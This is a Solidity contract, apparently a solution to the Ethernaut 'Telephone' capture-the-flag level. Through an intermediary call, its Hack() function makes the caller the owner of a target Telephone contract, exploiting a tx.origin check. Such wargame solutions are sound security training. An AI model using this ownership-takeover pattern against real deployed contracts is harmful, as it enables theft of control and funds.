// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneHack {
    Telephone teleAddress;

    constructor(Telephone _teleAddress)public{
        teleAddress=Telephone(_teleAddress);
    }

    function Hack()public{
        teleAddress.changeOwner(msg.sender);
    }
}
